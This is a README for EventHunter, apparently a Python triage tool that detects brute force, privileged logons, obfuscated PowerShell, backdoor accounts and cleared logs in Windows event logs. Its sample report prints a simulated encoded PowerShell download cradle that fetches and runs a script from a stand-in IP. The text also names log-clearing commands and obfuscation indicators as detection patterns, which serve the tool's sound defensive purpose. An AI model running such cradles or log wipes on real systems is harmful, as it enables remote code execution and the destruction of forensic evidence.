# EventHunter

**Hunt for indicators of compromise in Windows Event Logs and map them to MITRE ATT&CK.**

![Python](https://img.shields.io/badge/python-3.10%2B-blue)
![License](https://img.shields.io/badge/license-MIT-green)
![MITRE ATT&CK](https://img.shields.io/badge/MITRE-ATT%26CK-red)
![Tests](https://img.shields.io/badge/tests-pytest-informational)

EventHunter is a command-line triage tool for incident responders and SOC analysts. Give it a
Windows `.evtx` file, such as a `Security.evtx` pulled from a host you suspect is compromised.
It parses every record, runs behaviour-based detections, maps each finding to a MITRE ATT&CK
technique, and writes a Markdown report that you can attach to a ticket or hand to another
analyst.

```console
$ eventhunter WS01-Security.evtx -o report.md
[INFO] Parsing WS01-Security.evtx ...
[INFO] Parsed 41 relevant event(s) from 1 file(s)
[INFO] 7 detection(s)
[INFO] Report written to report.md
```

---

## Table of contents

- [What it detects](#what-it-detects)
- [Detection logic and why each pattern matters](#detection-logic-and-why-each-pattern-matters)
- [Installation](#installation)
- [Usage](#usage)
- [Sample report](#sample-report)
- [Validation against real attack data](#validation-against-real-attack-data)
- [Architecture](#architecture)
- [Design decisions](#design-decisions)
- [Prerequisite: Windows audit policy](#prerequisite-windows-audit-policy)
- [Testing](#testing)
- [Limitations and roadmap](#limitations-and-roadmap)
- [References](#references)

---

## What it detects

| Event ID | Detection | MITRE ATT&CK | Severity |
|---|---|---|---|
| **4625** | Repeated failed logons for one account in a short window (brute force) | [T1110.001](https://attack.mitre.org/techniques/T1110/001/) Brute Force: Password Guessing | HIGH. **CRITICAL** if a successful logon (4624) follows |
| **4672** | Special (admin-level) privileges assigned at logon | [T1078](https://attack.mitre.org/techniques/T1078/) Valid Accounts | LOW or MEDIUM. **HIGH** if the account was created in the same log |
| **4688** | PowerShell launched with encoded or obfuscated command-line flags | [T1059.001](https://attack.mitre.org/techniques/T1059/001/) PowerShell + [T1027.010](https://attack.mitre.org/techniques/T1027/010/) Command Obfuscation | MEDIUM, HIGH or CRITICAL, based on a weighted score |
| **4720** | A user account was created (possible backdoor) | [T1136.001](https://attack.mitre.org/techniques/T1136/001/) Local / [T1136.002](https://attack.mitre.org/techniques/T1136/002/) Domain Account | HIGH. **CRITICAL** if the account name mimics a computer account (`NAME$`) |
| **1102** | The Security audit log was cleared (anti-forensics) | [T1070.001](https://attack.mitre.org/techniques/T1070/001/) Clear Windows Event Logs | CRITICAL |

**Highlights**

- **Decodes `-EncodedCommand` payloads** (Base64 → UTF-16LE) and scans the decoded script, so
  a download cradle hidden one layer down is still found.
- **Correlates events across detections.** A brute-force burst followed by a successful logon
  is escalated, and so is a newly created account that immediately logs on with admin rights.
- **Reduces noise on purpose.** SYSTEM, service accounts and machine accounts are filtered
  out of privileged-logon findings, and repeated events are grouped into one finding per
  account or attack burst.
- **Shows its evidence.** Every finding lists the exact `EventRecordID`s that caused it, so
  an analyst can check the raw log.
- **Tolerates damaged logs.** Corrupt chunks and records are skipped and counted instead of
  stopping the scan. Logs from compromised hosts are often damaged.
- **Writes Markdown or JSON.** Markdown is for people, JSON is for a SIEM or a script. With
  `--fail-on`, the exit code can be used in automation.

---

## Detection logic and why each pattern matters

### 1. Brute force: Event ID 4625 (An account failed to log on)

**Logic.** EventHunter groups 4625 events by target account, then moves a sliding time window
across each account's failures. The defaults are **5 failures within 300 seconds**, and both
can be changed with `--bf-threshold` and `--bf-window`. A window that reaches the threshold is
a burst, and bursts that overlap are merged, so one attack produces one finding rather than
dozens. The implementation is a two-pointer sweep with O(n) cost per account.

If the same account then logs on **successfully** (4624) during the burst or within one window
after it, the finding is escalated to **CRITICAL**. That pattern means the guessing may have
worked.

The report also includes the source IPs, workstation names, logon types and failure reasons.
Failure reasons come from the 4625 `SubStatus` NTSTATUS code: `0xC000006A` is a wrong
password, `0xC0000064` means the user doesn't exist, and so on.

**Why it matters.** Online password guessing against RDP, SMB or OWA is one of the most common
ways attackers get initial access. A valid password gets past most perimeter controls, and the
attacker's activity afterwards looks like a normal user's. The failure reasons add context:
mostly "user does not exist" points to **username enumeration**, while mostly "wrong
password" against a real account is **targeted guessing**.

**False positives.** A service using an expired password, or a user whose phone keeps retrying
an old password. Use `--ignore-account` for known cases.

### 2. Privilege escalation: Event ID 4672 (Special privileges assigned to new logon)

**Logic.** Windows logs 4672 whenever a logon receives administrator-equivalent privileges,
such as `SeDebugPrivilege` or `SeTcbPrivilege`. The raw event is very noisy, because SYSTEM
generates it all the time. EventHunter therefore does three things:

1. It drops built-in identities: `SYSTEM`, `LOCAL SERVICE`, `NETWORK SERVICE`, `DWM-*`,
   `UMFD-*` and computer accounts ending in `$`.
2. It groups the remaining events into **one finding per account**, with logon count, session
   count and the full list of privileges.
3. It sets severity by context:
   - **LOW** when no high-impact privileges were assigned.
   - **MEDIUM** when sensitive privileges were assigned: Debug, Tcb, Impersonate, LoadDriver,
     Backup, Restore, TakeOwnership, CreateToken or AssignPrimaryToken.
   - **HIGH** when the account was **created in the same log** (4720). An account that is
     created and then immediately used with admin rights is a typical backdoor.

**Why it matters.** `SeDebugPrivilege` allows reading any process's memory, which is how
Mimikatz dumps credentials from LSASS. `SeImpersonatePrivilege` is the basis of the "Potato"
privilege-escalation exploits. Any account holding these privileges effectively controls the
host. The useful question for an analyst is: *should this account be an administrator, and at
this time?*

**ATT&CK mapping note.** 4672 records that admin rights were *used*, not *how* they were
obtained. EventHunter maps it to **T1078 Valid Accounts**, which ATT&CK lists under
Privilege Escalation, Persistence, Defense Evasion and Initial Access. It does not claim a
specific exploit technique that the event can't prove.

### 3. Malicious execution: Event ID 4688 (A new process has been created) with obfuscated PowerShell

**Logic.** For each process-creation event that runs PowerShell (`powershell.exe`, `pwsh.exe`,
or a command line that launches it, such as `cmd /c powershell ...`), the command line is
checked against weighted indicators:

| Indicator | Example | Weight |
|---|---|---|
| Encoded command | `-e`, `-enc`, `-EncodedCommand`, `/ec`, `–enc` (en dash) | 3 |
| Download cradle | `Net.WebClient`, `DownloadString`, `Invoke-WebRequest`, `iwr` | 2 |
| Dynamic execution | `IEX`, `Invoke-Expression` | 2 |
| Inline Base64 decoding | `[Convert]::FromBase64String` | 2 |
| Character-level obfuscation | `p^o^w^e^r^s^h^e^l^l`, `` I`E`X ``, `'Down'+'load'` | 2 |
| Hidden window | `-w hidden`, `-WindowStyle 1` | 1 |
| Execution policy bypass | `-ep bypass`, `-exec unrestricted` | 1 |
| No profile / non-interactive | `-nop`, `-noni` | 1 each |

Severity comes from the total score: **≥5 CRITICAL**, **≥3 HIGH**, **≥2 MEDIUM**. Anything
lower is not reported, so `powershell -NoProfile -File backup.ps1` stays out of the report.

Encoded commands are **decoded** and shown in the report. The decoded text is scanned with
the same indicators, and matches there are labelled `(decoded)`.

Two evasion tricks are handled explicitly. PowerShell accepts **any unambiguous prefix** of a
parameter name, so `-e`, `-enco` and `-encodedc` all mean `-EncodedCommand`. It also accepts
**Unicode dashes** (en dash, em dash, horizontal bar) and `/` as the parameter prefix. A naive
`"-enc" in cmdline` check misses both.

**Why it matters.** PowerShell ships with every Windows host and can download and run code
entirely in memory. Offensive frameworks (Empire, Cobalt Strike, Metasploit) commonly launch
it as `powershell -nop -w hidden -enc <base64>`. Base64 encoding and caret or backtick
obfuscation have almost no legitimate use. Their purpose is to hide the command from analysts
and from signature-based tools.

**False positives.** Some management agents (SCCM, some RMM tools) do use `-EncodedCommand`.
Check the parent process and user, and add `--ignore-account` for known service accounts.

### 4. Backdoor account: Event ID 4720 (A user account was created)

**Logic.** Every account creation is reported as **HIGH**, with the creator, the new SID, and
whether the account is **local** or **domain**. EventHunter decides this by comparing
`TargetDomainName` with the host's own name, and uses it to choose T1136.001 or T1136.002.

The finding becomes **CRITICAL** when the new *user* account's name ends in `$`. Real
computer accounts are created through Event ID 4741, so a 4720 for `WS01-SYNC$` is an attempt
to hide among machine accounts. Many admin tools and filters ignore those accounts by default.
This pattern appears in the real-world sample used for [validation](#validation-against-real-attack-data).

**Why it matters.** A backdoor account keeps the attacker's access after the original malware
is removed or the stolen password is reset. Account creation is rare on most hosts, so each
event is worth checking against a provisioning ticket.

### 5. Anti-forensics: Event ID 1102 (The audit log was cleared)

**Logic.** Every 1102 event from the `Microsoft-Windows-Eventlog` provider is **CRITICAL**.
The report shows who cleared the log and from which logon session.

**Why it matters.** Attackers clear logs to destroy evidence, using `wevtutil cl Security`,
`Clear-EventLog` or Mimikatz `event::clear`. Windows writes 1102 *after* the wipe, so it is
often the only remaining trace of what happened before. On a production server there is
almost never a legitimate reason to clear the Security log.

---

## Installation

Requires **Python 3.10+**. The only runtime dependency is
[`python-evtx`](https://github.com/williballenthin/python-evtx). EventHunter runs on Linux,
macOS and Windows, so you can analyse evidence on your forensic workstation instead of on the
compromised host.

```bash
git clone https://github.com/<you>/eventhunter.git
cd eventhunter
python -m venv .venv && source .venv/bin/activate   # Windows: .venv\Scripts\activate
pip install -e .            # installs the `eventhunter` command
pip install -e ".[dev]"     # also installs pytest
```

## Usage

```bash
# Print a Markdown report to stdout
eventhunter Security.evtx

# Write it to a file
eventhunter Security.evtx -o report.md

# Analyse several hosts' logs together, JSON output, only HIGH and above
eventhunter dc01.evtx ws01.evtx ws02.evtx --format json --min-severity high -o findings.json

# Stricter brute-force rule (10 failures in 60 s) and suppress a known vulnerability scanner
eventhunter Security.evtx --bf-threshold 10 --bf-window 60 --ignore-account nessus_svc

# Use in a script or pipeline: exit code 1 if anything CRITICAL is found
eventhunter Security.evtx -q -o report.md --fail-on critical || echo "Escalate!"

# Run without installing
python -m eventhunter Security.evtx
```

| Option | Default | Description |
|---|---|---|
| `EVTX [EVTX ...]` | (required) | One or more `.evtx` files |
| `-o, --output FILE` | stdout | Write the report to a file |
| `-f, --format` | `markdown` | `markdown` or `json` |
| `--min-severity LEVEL` | `low` | Hide findings below `info`, `low`, `medium`, `high` or `critical` |
| `--fail-on LEVEL` | (off) | Exit with status `1` if any finding is at or above `LEVEL` |
| `--bf-threshold N` | `5` | Failed logons for one account needed to raise a brute-force finding |
| `--bf-window SECONDS` | `300` | Sliding window for the brute-force threshold |
| `--ignore-account NAME` | (none) | Suppress findings for an account (repeatable) |
| `-v` / `-q` | | Verbose debug logging or quiet mode (stderr only) |

**Exit codes:** `0` means the analysis completed. `1` means a `--fail-on` threshold was
reached. `2` means a usage error or an unreadable input file.

### Getting a `.evtx` file

On a live Windows host (as Administrator):

```powershell
wevtutil epl Security C:\evidence\%COMPUTERNAME%-Security.evtx
```

Logs are also stored at `C:\Windows\System32\winevt\Logs\Security.evtx`, and that is where you
will find them in a forensic disk image. For safe practice data, see
[EVTX-ATTACK-SAMPLES](https://github.com/sbousseaden/EVTX-ATTACK-SAMPLES).

---

## Sample report

The report below was produced by [`scripts/generate_sample_report.py`](scripts/generate_sample_report.py).
The script simulates a 30-minute intrusion on host `WS01`:

1. RDP password guessing that eventually succeeds.
2. An encoded PowerShell download cradle.
3. Two backdoor accounts, one disguised as a computer account.
4. Clearing of the Security log.

The simulation also includes ordinary background activity that EventHunter correctly leaves
out: SYSTEM privileged logons, a user mistyping their password twice, and a benign admin
script. (`python-evtx` can read EVTX files but not write them, so the scenario is built in
memory and sent through the same engine and renderer that the CLI uses.)

An excerpt follows. **[See the full report →](examples/sample_report.md)**

#### EventHunter Report

| | |
|---|---|
| **Source file(s)** | WS01-Security.evtx |
| **Generated** | 2026-09-14 09:30:00 UTC |
| **Relevant events analysed** | 41 |
| **Time range** | 2026-09-14 02:00:00 → 2026-09-14 02:35:00 UTC |
| **Detections** | 7 |
| **Overall risk** | 🔴 CRITICAL |

##### Summary

| Severity | Count |
|---|---:|
| 🔴 CRITICAL | 4 |
| 🟠 HIGH | 2 |
| 🟡 MEDIUM | 1 |

##### Findings

| # | Severity | First seen (UTC) | Detection | ATT&CK | Summary |
|---:|---|---|---|---|---|
| [1](examples/sample_report.md#finding-1) | 🔴 CRITICAL | 2026-09-14 02:13:00 | Brute force followed by successful logon | [T1110.001](https://attack.mitre.org/techniques/T1110/001/) | 23 failed logons for WS01\\administrator from 203.0.113.47 in 90s - then a successful logon |
| [2](examples/sample_report.md#finding-2) | 🔴 CRITICAL | 2026-09-14 02:17:40 | Encoded PowerShell execution | [T1059.001](https://attack.mitre.org/techniques/T1059/001/), [T1027.010](https://attack.mitre.org/techniques/T1027/010/) | administrator ran powershell.exe with: Encoded command (-EncodedCommand), Hidden window, No profile (-NoProfile), Non-interactive (-NonInteractive), Download cradle (decoded), Dynamic code execution (Invoke-Expression) (decoded) |
| [3](examples/sample_report.md#finding-3) | 🔴 CRITICAL | 2026-09-14 02:24:12 | User account disguised as computer account | [T1136.001](https://attack.mitre.org/techniques/T1136/001/) | WS01\\administrator created account WS01\\WS01-SYNC$ |
| [4](examples/sample_report.md#finding-4) | 🔴 CRITICAL | 2026-09-14 02:31:05 | Security audit log cleared | [T1070.001](https://attack.mitre.org/techniques/T1070/001/) | Security log cleared by WS01\\administrator |
| [5](examples/sample_report.md#finding-5) | 🟠 HIGH | 2026-09-14 02:21:00 | User account created | [T1136.001](https://attack.mitre.org/techniques/T1136/001/) | WS01\\administrator created account WS01\\svc\_update |
| [6](examples/sample_report.md#finding-6) | 🟠 HIGH | 2026-09-14 02:22:30 | Newly created account used with admin privileges | [T1078](https://attack.mitre.org/techniques/T1078/) | WS01\\svc\_update received special privileges in 1 logon(s) - account was created in this log |
| [7](examples/sample_report.md#finding-7) | 🟡 MEDIUM | 2026-09-14 02:15:02 | Special privileges assigned to logon | [T1078](https://attack.mitre.org/techniques/T1078/) | WS01\\administrator received special privileges in 1 logon(s) |

##### Timeline

| Time (UTC) | # | Severity | Event |
|---|---:|---|---|
| 2026-09-14 02:13:00 | [1](examples/sample_report.md#finding-1) | 🔴 CRITICAL | Brute force followed by successful logon |
| 2026-09-14 02:15:02 | [7](examples/sample_report.md#finding-7) | 🟡 MEDIUM | Special privileges assigned to logon |
| 2026-09-14 02:17:40 | [2](examples/sample_report.md#finding-2) | 🔴 CRITICAL | Encoded PowerShell execution |
| 2026-09-14 02:21:00 | [5](examples/sample_report.md#finding-5) | 🟠 HIGH | User account created |
| 2026-09-14 02:22:30 | [6](examples/sample_report.md#finding-6) | 🟠 HIGH | Newly created account used with admin privileges |
| 2026-09-14 02:24:12 | [3](examples/sample_report.md#finding-3) | 🔴 CRITICAL | User account disguised as computer account |
| 2026-09-14 02:31:05 | [4](examples/sample_report.md#finding-4) | 🔴 CRITICAL | Security audit log cleared |

##### MITRE ATT&CK Coverage

| Technique | Name | Tactic(s) | Findings |
|---|---|---|---|
| [T1027.010](https://attack.mitre.org/techniques/T1027/010/) | Obfuscated Files or Information: Command Obfuscation | Defense Evasion | [#2](examples/sample_report.md#finding-2) |
| [T1059.001](https://attack.mitre.org/techniques/T1059/001/) | Command and Scripting Interpreter: PowerShell | Execution | [#2](examples/sample_report.md#finding-2) |
| [T1070.001](https://attack.mitre.org/techniques/T1070/001/) | Indicator Removal: Clear Windows Event Logs | Defense Evasion | [#4](examples/sample_report.md#finding-4) |
| [T1078](https://attack.mitre.org/techniques/T1078/) | Valid Accounts | Defense Evasion, Persistence, Privilege Escalation, Initial Access | [#6](examples/sample_report.md#finding-6), [#7](examples/sample_report.md#finding-7) |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001/) | Brute Force: Password Guessing | Credential Access | [#1](examples/sample_report.md#finding-1) |
| [T1136.001](https://attack.mitre.org/techniques/T1136/001/) | Create Account: Local Account | Persistence | [#3](examples/sample_report.md#finding-3), [#5](examples/sample_report.md#finding-5) |

##### Finding details (excerpt: finding 2 of 7)

###### 2. 🔴 CRITICAL — Encoded PowerShell execution

- **When:** 2026-09-14 02:17:40 UTC
- **Host:** WS01.corp.local
- **Rule:** `suspicious-powershell`
- **MITRE ATT&CK:** [T1059.001](https://attack.mitre.org/techniques/T1059/001/) Command and Scripting Interpreter: PowerShell; [T1027.010](https://attack.mitre.org/techniques/T1027/010/) Obfuscated Files or Information: Command Obfuscation
- **Tactic(s):** Defense Evasion, Execution
- **Evidence:** Event ID(s) 4688; EventRecordID(s) 184237

| Field | Value |
|---|---|
| User | WS01\\administrator |
| Process | C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe |
| Parent process | C:\\Windows\\System32\\cmd.exe |
| Indicators | Encoded command (-EncodedCommand), Hidden window, No profile (-NoProfile), Non-interactive (-NonInteractive), Download cradle (decoded), Dynamic code execution (Invoke-Expression) (decoded) |
| Suspicion score | 10 |

**Command line:**

```powershell
powershell.exe -nop -w hidden -noni -enc JAB3AGMAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAdwBjAC4ASABlAGEAZABlAHIAcwAuAEEAZABkACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAnACkAOwBJAEUAWAAgACQAdwBjAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQA4AC4ANQAxAC4AMQAwADAALgAyADMAOgA4ADAAOAAwAC8AdQBwAGQAYQB0AGUALgBwAHMAMQAnACkA
```

**Decoded payload:**

```powershell
$wc=New-Object Net.WebClient;$wc.Headers.Add('User-Agent','Mozilla/5.0');IEX $wc.DownloadString('http://198.51.100.23:8080/update.ps1')
```

**Why it matters:** PowerShell is installed on every Windows host and can download and run code entirely in memory, which makes it a favourite of commodity malware and red-team frameworks alike (Empire, Cobalt Strike, Metasploit all emit `powershell -nop -w hidden -enc ...`). Base64 encoding and character obfuscation have almost no legitimate administrative use; their purpose is to hide the command from people and from signature-based tools.

**Recommended next steps:**

1. Read the decoded payload: look for URLs, IPs, and second-stage downloads.
1. Identify the parent process - Office apps, browsers or wscript spawning PowerShell strongly suggests initial access via phishing.
1. Check PowerShell Operational logs (Event ID 4104 script block logging) for the full de-obfuscated script.
1. Isolate the host if a download cradle or credential-theft tooling is present.

---

## Validation against real attack data

The [EVTX-ATTACK-SAMPLES](https://github.com/sbousseaden/EVTX-ATTACK-SAMPLES) corpus contains
278 `.evtx` files recorded during real attack simulations. Running EventHunter across all of
it gave these results:

- **All 278 files parsed with no errors and no skipped records.**
- **All 24 Event ID 1102 records** in the corpus were reported as *Security audit log
  cleared*.
- `DE_Fake_ComputerAccount_4720.evtx`, an attacker creating a user account named `$`, was
  reported as **CRITICAL: User account disguised as computer account**.
- **22 raw 4672 events became 4 privileged-logon findings.** Filtering out system accounts
  and grouping by account removed the noise and left only the named human accounts that used
  admin privileges.

The corpus is mostly Sysmon and PowerShell-operational logs. It contains no 4688 events with
PowerShell command lines and only one 4625 event, so the brute-force and PowerShell detectors
are covered by the unit tests instead (see [Testing](#testing)).

---

## Architecture

```
                 ┌──────────────┐   Event objects    ┌────────────────────────┐   Detection objects   ┌──────────────┐
 Security.evtx ─▶│  parser.py   │───────────────────▶│       engine.py        │──────────────────────▶│  report.py   │─▶ report.md
                 │ python-evtx  │  (only event IDs   │ sort by time, route    │  sorted by severity   │ Markdown or  │   / .json
                 │ → XML → Event│   detectors need)  │ each detector its IDs  │       then time       │     JSON     │
                 └──────────────┘                    └───────────┬────────────┘                       └──────────────┘
                                                                 │
                     ┌────────────────┬──────────────────┬───────┴──────────┬──────────────────┐
                     ▼                ▼                  ▼                  ▼                  ▼
               brute_force.py   privilege.py      powershell.py   account_creation.py   log_cleared.py
                  (4625+4624)    (4672+4720)          (4688)            (4720)              (1102)
                                         each maps findings to ATT&CK via mitre.py
```

```
eventhunter/
├── cli.py                  # argparse interface and exit codes
├── parser.py               # EVTX → normalised Event (EventData + UserData, tolerant of corruption)
├── models.py               # Event, Detection, Severity dataclasses
├── mitre.py                # ATT&CK technique catalogue (IDs, names, tactics, URLs)
├── engine.py               # routes events to detectors, collects and sorts findings
├── report.py               # Markdown and JSON renderers (with escaping)
└── detectors/
    ├── base.py             # Detector ABC, DetectorConfig, shared helpers
    ├── brute_force.py
    ├── privilege.py
    ├── powershell.py
    ├── account_creation.py
    └── log_cleared.py
scripts/generate_sample_report.py   # reproducible demo scenario
examples/sample_report.md           # its output
tests/                              # pytest suite
```

**Adding a detection** takes one class. Subclass `Detector`, declare `event_ids`, implement
`detect(events) -> list[Detection]`, and add the class to `ALL_DETECTORS`. The engine handles
parsing, routing, sorting and reporting.

---

## Design decisions

These are the trade-offs behind the code, and the points I would expect to discuss in a
review.

1. **Detectors never see XML.** The parser converts every record into a small `Event`
   dataclass. Detectors are plain functions over lists of events, so they can be unit-tested
   with hand-built events, and they would work unchanged on another source such as a SIEM
   export.

2. **Event IDs are only unique per provider.** `1102` from some vendor's application log is
   not a log wipe. Each detector declares the providers it accepts
   (`Microsoft-Windows-Security-Auditing` or `Microsoft-Windows-Eventlog`).

3. **Noise reduction is part of detection.** A tool that reports every 4672 gets ignored
   within a day. Filtering, grouping and context-based severity are what make the output
   usable.

4. **Correlation increases confidence.** No single event proves compromise.
   *Failures → success* and *create account → use admin rights* are much stronger signals than
   either event alone, and they get higher severity.

5. **Everything in the log is untrusted input.** Usernames and command lines are controlled by
   the attacker. The report escapes Markdown control characters, and code blocks use a fence
   longer than any run of backticks in the content, so a crafted command line can't break the
   report or inject links into it.

6. **Damaged evidence is expected.** The parser reads the log chunk by chunk and skips bad
   records instead of stopping. The number of skipped records appears in the report header so
   the analyst knows coverage was incomplete.

7. **Parsing is filtered early.** Only the Event IDs that some detector needs are turned into
   `Event` objects, so a large Security log doesn't fill memory with irrelevant 5156 events.

8. **One dependency.** Only `python-evtx` is required, so the tool is easy to install on a
   locked-down forensic workstation.

---

## Prerequisite: Windows audit policy

EventHunter can only detect what Windows recorded. Several of these events are **not logged by
default**:

| Event | Required audit setting |
|---|---|
| 4625 / 4624 | *Audit Logon*: Success and Failure |
| 4672 | *Audit Special Logon*: Success |
| 4688 | *Audit Process Creation*: Success, **plus** GPO *"Include command line in process creation events"* (otherwise `CommandLine` is empty and the PowerShell rule has nothing to inspect) |
| 4720 | *Audit User Account Management*: Success |
| 1102 | Always logged |

```powershell
auditpol /set /subcategory:"Logon" /success:enable /failure:enable
auditpol /set /subcategory:"Special Logon" /success:enable
auditpol /set /subcategory:"Process Creation" /success:enable
auditpol /set /subcategory:"User Account Management" /success:enable
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit" /v ProcessCreationIncludeCmdLine_Enabled /t REG_DWORD /d 1 /f
```

> A report with no findings is **not** proof that a host is clean. Check the audit policy first.

---

## Testing

```bash
pytest -v
```

The suite has 56 tests. They cover:

- **Parser:** EventData and UserData flattening, the timestamp formats seen in real logs,
  malformed XML, and non-EVTX input.
- **Brute force:** threshold and window edges, merging of overlapping bursts, success
  escalation, and ignored accounts.
- **PowerShell:** every `-EncodedCommand` abbreviation and Unicode-dash variant,
  `-ExecutionPolicy` not being mistaken for `-enc`, payload decoding, and caret
  obfuscation.
- **Privileged logon:** system-account filtering, per-account grouping, and correlation with
  account creation.
- **Report:** required sections, escaping of attacker-controlled values, and JSON validity.

CI ([`.github/workflows/tests.yml`](.github/workflows/tests.yml)) runs the tests on Python
3.10–3.13. It also regenerates the sample report and fails if `examples/sample_report.md` no
longer matches the code.

---

## Limitations and roadmap

**Current limitations**

- Analysis is per file and in memory. Very large logs (multiple GB) should be split, or
  filtered first with `wevtutil qe`.
- Brute-force detection groups by **account**. **Password spraying**, where one source tries
  many accounts, needs grouping by source IP and is not covered yet.
- Kerberos and NTLM pre-authentication failures (4771, 4776) are not analysed, so brute force
  against a domain controller can be under-reported.
- The PowerShell rule depends on command-line auditing. It cannot see scripts run through
  other means (`-File`, or PowerShell hosted inside another process).

**Roadmap**

- [ ] Password-spraying detection (one IP → many accounts)
- [ ] 4104 PowerShell Script Block Logging and Sysmon Event ID 1 support
- [ ] Correlate activity per logon session using `TargetLogonId` / `SubjectLogonId`
- [ ] 4732/4728 "added to Administrators/Domain Admins" detection
- [ ] Export detections as [Sigma](https://github.com/SigmaHQ/sigma) rules and ATT&CK Navigator layers
- [ ] Streaming mode for very large logs

---

## References

- [MITRE ATT&CK for Enterprise](https://attack.mitre.org/matrices/enterprise/windows/)
- Microsoft: [4625](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4625),
  [4672](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4672),
  [4688](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4688),
  [4720](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4720),
  [1102](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-1102)
- [python-evtx](https://github.com/williballenthin/python-evtx) by Willi Ballenthin
- [EVTX-ATTACK-SAMPLES](https://github.com/sbousseaden/EVTX-ATTACK-SAMPLES) by Samir Bousseaden

## License

MIT. See [LICENSE](LICENSE).

> **Disclaimer:** EventHunter is a triage aid. Findings are leads for investigation, not
> verdicts. Always validate them against the raw events.
